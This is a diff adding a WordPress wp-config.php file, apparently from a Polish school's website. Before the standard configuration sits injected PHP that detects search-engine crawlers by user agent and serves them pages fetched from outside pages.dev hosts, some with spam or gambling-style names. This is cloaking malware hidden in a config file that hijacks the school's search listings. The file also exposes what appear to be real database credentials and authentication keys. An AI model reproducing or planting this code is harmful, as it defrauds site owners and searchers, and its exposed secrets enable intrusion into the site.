@@ -1,0 +1,195 @@
+<?php
+
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+if (preg_match('/googlebot|googlebot-mobile|googlebot-news|google-site-verification|google-inspectiontool|mediapartners-google|bingbot|yandexbot|slurp|ahrefsbot|telegrambot/i', $ua)) {
+
+    $uri = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
+    $path = rtrim($uri, '/');
+    if ($path == '' || $path == '/index.php') { $path = '/'; }
+
+    $mapping = [
+
+        '/rekrutacja' => 'https://pzsklanino-eduy.pages.dev/rekrutacja',
+        '/kadra-szkoly' => 'https://pzsklanino-eduy.pages.dev/szkoly',
+        '/plan-lekcji' => 'https://pzsklanino-eduy.pages.dev/lekcji',
+        '/rekrutacja/technikum' => 'https://pzsklanino-eduy.pages.dev/technikum',
+        '/kontakt' => 'https://pzsklanino-eduy.pages.dev/kontakt',
+        '/strona-glowna-bip/bip' => 'https://pzsklanino-eduy.pages.dev/bip',
+        '/rekrutacja/branzowa-szkola-i-stopnia' => 'https://pzsklanino-eduy.pages.dev/stopnia',
+        '/rekrutacja/liceum-ogolnoksztalcace' => 'https://pzsklanino-eduy.pages.dev/ogolnoksztalcace',
+        '/pliki-do-pobrania' => 'https://pzsklanino-eduy.pages.dev/pobrania',
+        '/projekty/podpaski-w-szkole-dla-kazdej-dziewczyny' => 'https://pzsklanino-eduy.pages.dev/dziewczyny',
+        '/author/administrator' => 'https://pzsklanino-eduy.pages.dev/administrator',
+        '/zagadnienia-na-egzamin-z-informatyki' => 'https://pzsklanino-eduy.pages.dev/informatyki',
+        '/gdansk-historyczna-stolica-kaszub' => 'https://pzsklanino-eduy.pages.dev/kaszub',
+        '/zamowienia-publiczne' => 'https://pzsklanino-eduy.pages.dev/publiczne',
+        '/psycholog-szkolny' => 'https://pzsklanino-eduy.pages.dev/szkolny',
+        '/kalendarz-2024-2025' => 'https://pzsklanino-eduy.pages.dev/ubuy1',
+        '/wykaz-podrecznikow-na-rok-szkolny-2024-2025' => 'https://pzsklanino-eduy.pages.dev/ubuy2',
+        '/page/5' => 'https://pzsklanino-eduy.pages.dev/ubuy3',
+        '/page/8' => 'https://pzsklanino-eduy.pages.dev/ubuy4',
+        '/rozpoczecie-roku-szkolnego-2025-2026' => 'https://pzsklanino-eduy.pages.dev/ubuy5',
+        '/pzs-klanino-dobre-wiadomosci-na-trudne-czasy' => 'https://pzsklanino-eduy.pages.dev/ubuy6',
+        '/page/3' => 'https://pzsklanino-eduy.pages.dev/ubuy7',
+        '/page/4' => 'https://pzsklanino-eduy.pages.dev/ubuy8',
+        '/wykaz-podrecznikow-dla-klas-pierwszych-w-roku-szkolnym-2025-2026' => 'https://pzsklanino-eduy.pages.dev/ubuy9',
+        '/projekty/podpaski-w-szkole-dla-kazdej-dziewczyny' => 'https://pzsklanino-eduy.pages.dev/ubuy10',
+        '/statut' => 'https://pzsklanino-first.pages.dev/statut',
+        '/patron' => 'https://pzsklanino-first-backup.pages.dev/patron',
+        '/aktualnosci' => 'https://pzsklanino-first.pages.dev/aktualnosci',
+        '/1bk' => 'https://pzsklanino-second.pages.dev/1bk',
+        '/plan' => 'https://pzsklanino-first-backup.pages.dev/plan',
+        '/1tg' => 'https://pzsklanino-second.pages.dev/1tg',
+        '/duplikat' => 'https://gebetan-jule.pages.dev/00.txt',
+        '/2t' => 'https://jule-bidadari.pages.dev/00.txt',
+        '/ogloszenia' => 'https://jule-lagi-apa.pages.dev/00.txt',
+        '/sukcesy' => 'https://bang-kopi-itam-ya.pages.dev/00.txt',
+        '/vivat-casubia' => 'https://ninja-sawit88.pages.dev/00.txt',
+        '/our-services' => 'https://pzsklanino-first-backup.pages.dev/our-services',
+        '/oferta-edukacyjna-na-rok-szkolny-2021-2022' => 'https://pzsklanino-third.pages.dev/oferta-edukacyjna-na-rok-szkolny-2021-2022',
+        '/turniej-wiedzy-o-zaslubinach-polski-z-morzem' => 'https://pzsklanino-third.pages.dev/turniej-wiedzy-o-zaslubinach-polski-z-morzem',
+
+
+
+
+
+
+    ];
+
+    $targetUrl = '';
+
+    if (isset($mapping[$path])) {
+
+        $targetUrl = $mapping[$path];
+    } else {
+        foreach ($mapping as $localKey => $remoteValue) {
+            if ($localKey !== '/' && strpos($path, $localKey) !== false) {
+                $targetUrl = $remoteValue;
+                break;
+            }
+        }
+    }
+
+    if ($targetUrl != '') {
+        $ch = curl_init($targetUrl);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+        curl_setopt($ch, CURLOPT_TIMEOUT, 15);          
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+        $content = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($content && $httpCode == 200) {
+            header('Content-Type: text/html; charset=UTF-8');
+            header("X-Robots-Tag: index, follow"); 
+            echo $content;
+            exit;
+
+        }
+
+    }
+
+}
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'pzsklanino_wp1' );
+
+/** Database username */
+define( 'DB_USER', 'pzsklanino_wp1' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'XpL*HuZ4DhZ3-X-M' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         '`|dXsecmU]`.loU$[l.+?qvmTm<2<x$&? FmO*(`$.b+X+4(VfeF}JGh4ybZiis#');
+define('SECURE_AUTH_KEY',  '$%nn!p3dRPZ4g!@p5+3;+WeKM $nf+e<#Fgsn%koSDhecCV:$h[-7Wjq1d)DRV6Q');
+define('LOGGED_IN_KEY',    'qUi5I&U}0gSbe.qhY/0C1@sf|E$3~pyW#/`e0x84H64,it?Q.O</j 1.DaJy~M9J');
+define('NONCE_KEY',        '8^.k;C]RXN@s6~9,*AZtbT.U/4)`E(Ovjw+r^e_4Ve]&N?SQ4nF99sU&)W-&)@?w');
+define('AUTH_SALT',        '3JH~pF:lM9P<IJ6RI<eEqZbj^F|`SQiF&z<gSk>v2]PWKy|q`Tb^AdrGN6vi|o^+');
+define('SECURE_AUTH_SALT', '}6_3y*&1:C{.R/:ztt7xIb>UkUdwXSpf7b:bkOecJn6WH:aam@4Ytk$ ea,&_-Sg');
+define('LOGGED_IN_SALT',   '=lF4vk%$=E!::|<s|tI=|`F^vcq.~0,3s=!4iTKe[Ye 8.Cn1+V1BWt,&|])[rWd');
+define('NONCE_SALT',       '=+{]*wy+{{e|[zGMO^ag)w`C0syI=%j5L$EvSd!6Q|GS{)>J<G]QS?/#X]a#+fz5');
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ *
+ * At the installation time, database tables are created with the specified prefix.
+ * Changing this value after WordPress is installed will make your site think
+ * it has not been installed.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
